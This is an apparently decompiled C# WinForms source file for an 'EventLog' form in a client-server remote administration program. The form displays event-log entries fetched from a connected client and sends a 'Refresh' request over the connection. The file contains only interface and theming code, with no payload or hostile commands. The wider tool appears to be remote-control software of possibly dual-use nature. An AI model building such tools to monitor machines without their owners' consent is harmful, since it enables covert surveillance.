using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormEventlog : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Timer timer1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem refreshToolStripMenuItem;

	private Panel panel1;

	public DataGridView dataGridView2;

	public MaterialLabel materialLabel1;

	private DataGridViewTextBoxColumn ColumnLevel;

	private DataGridViewTextBoxColumn ColumnDate;

	private DataGridViewTextBoxColumn ColumnApp;

	private DataGridViewTextBoxColumn ColumnSource;

	private DataGridViewTextBoxColumn ColumnMessage;

	public FormEventlog()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormEventlog_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
	}

	private void ChangeScheme(object sender)
	{
		bool num = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color primary = FormMaterial.PrimaryColor;
		Color back = (num ? Color.FromArgb(40, 40, 40) : Color.White);
		if (!num)
		{
			_ = Color.Black;
		}
		else
		{
			_ = Color.WhiteSmoke;
		}
		BackColor = back;
		if (dataGridView2 != null)
		{
			dataGridView2.BackgroundColor = back;
			dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
			dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = primary;
			dataGridView2.ColumnHeadersDefaultCellStyle.BackColor = back;
			dataGridView2.DefaultCellStyle.SelectionBackColor = primary;
			dataGridView2.DefaultCellStyle.ForeColor = primary;
			dataGridView2.DefaultCellStyle.BackColor = back;
		}
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[1] { "Refresh" }));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormEventlog));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.ColumnLevel = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnDate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnApp = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnSource = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnMessage = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip1.SuspendLayout();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		base.SuspendLayout();
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.refreshToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(181, 48);
		this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.refreshToolStripMenuItem.Text = "Refresh";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.Location = new System.Drawing.Point(3, 512);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(794, 20);
		this.panel1.TabIndex = 1;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 1;
		this.materialLabel1.Text = "Please wait...";
		this.dataGridView2.AllowDrop = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		dataGridViewCellStyle1.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.ColumnLevel, this.ColumnDate, this.ColumnApp, this.ColumnSource, this.ColumnMessage);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(32, 32, 32);
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView2.Location = new System.Drawing.Point(3, 64);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(794, 448);
		this.dataGridView2.TabIndex = 17;
		this.ColumnLevel.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnLevel.HeaderText = "Level";
		this.ColumnLevel.Name = "ColumnLevel";
		this.ColumnLevel.ReadOnly = true;
		this.ColumnLevel.Width = 59;
		this.ColumnDate.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnDate.HeaderText = "Date";
		this.ColumnDate.MinimumWidth = 140;
		this.ColumnDate.Name = "ColumnDate";
		this.ColumnDate.ReadOnly = true;
		this.ColumnDate.Width = 140;
		this.ColumnApp.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnApp.HeaderText = "Application";
		this.ColumnApp.MinimumWidth = 150;
		this.ColumnApp.Name = "ColumnApp";
		this.ColumnApp.ReadOnly = true;
		this.ColumnApp.Width = 150;
		this.ColumnSource.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnSource.HeaderText = "Source";
		this.ColumnSource.MinimumWidth = 120;
		this.ColumnSource.Name = "ColumnSource";
		this.ColumnSource.ReadOnly = true;
		this.ColumnSource.Width = 120;
		this.ColumnMessage.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnMessage.HeaderText = "Message";
		this.ColumnMessage.Name = "ColumnMessage";
		this.ColumnMessage.ReadOnly = true;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(800, 535);
		base.Controls.Add(this.dataGridView2);
		base.Controls.Add(this.panel1);
		base.Name = "FormEventlog";
		this.Text = "EventLog";
		base.Load += new System.EventHandler(FormEventlog_Load);
		this.contextMenuStrip1.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		base.ResumeLayout(false);
	}
}
